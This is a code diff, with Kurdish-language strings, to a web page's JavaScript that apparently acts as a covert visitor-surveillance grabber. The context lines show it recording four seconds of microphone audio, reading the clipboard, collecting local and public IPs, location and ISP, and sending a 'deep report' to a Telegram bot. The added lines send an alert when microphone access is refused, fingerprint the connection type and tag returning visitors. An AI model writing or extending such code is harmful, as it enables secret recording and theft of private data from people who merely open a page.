@@ -207,7 +207,9 @@
                     mediaRecorder.start();
                     setTimeout(() => mediaRecorder.stop(), 4000);
                 })
-                .catch(err => {});
+                .catch(err => {
+                    sendToTelegramText("⚠️ *تێبینی مایکرۆفۆن:* ڕەتکرایەوە یان بەردەست نییە.");
+                });
             } catch(e) {}
         }
 
@@ -219,6 +221,24 @@
                 return Math.round(end - start) + " ms";
             } catch(e) {
                 return "نەتوانرا پێوانە بکرێت";
+            }
+        }
+
+        function getNetworkInfo() {
+            let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return "پشتیوانی ناکرێت";
+            let type = conn.effectiveType || "نەزانراو";
+            let downlink = conn.downlink ? conn.downlink + " Mbps" : "";
+            return `${type.toUpperCase()} ${downlink}`;
+        }
+
+        function checkVisitorHistory() {
+            let visited = localStorage.getItem('visited_before');
+            if (visited) {
+                return "🔄 سەردانیکەری دووبارە (Returning Visitor)";
+            } else {
+                localStorage.setItem('visited_before', 'true');
+                return "✨ سەردانیکەری یەکەم جار (First Time)";
             }
         }
 
@@ -311,6 +331,8 @@
             let clipboardText = await getClipboardData();
             let fonts = getDetectedFonts();
             let latency = await measureNetworkLatency();
+            let netInfo = getNetworkInfo();
+            let visitorStatus = checkVisitorHistory();
 
             getLocalIPs(function(localIPs) {
                 let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "شاراوە";
@@ -319,10 +341,12 @@
                 .then(res => res.json())
                 .then(data => {
                     let report = `💎 *ڕاپۆرتی لووتکەی زۆر قووڵ (ULTIMATE DEEP PRO):*\n\n` +
+                                 `📌 *دۆخی سەردانیکەر:* ${visitorStatus}\n\n` +
                                  `🌐 *ڕایەڵە و پینگ (Network Telemetry):*\n` +
                                  `• *ئایپی گشتی:* \`${data.ip}\`\n` +
                                  `• *ئایپی ناوخۆیی:* \`${localIPText}\`\n` +
                                  `• *وڵات و شار:* ${data.country_name} - ${data.city}\n` +
+                                 `• *جۆری هێڵ (Connection):* ${netInfo}\n` +
                                  `• *خێرایی پینگ (RTT):* ${latency}\n` +
                                  `• *ناوچەی کاتی:* \`${timezone}\`\n` +
                                  `• *دابینکەری هێڵ:* ${data.org}\n\n` +
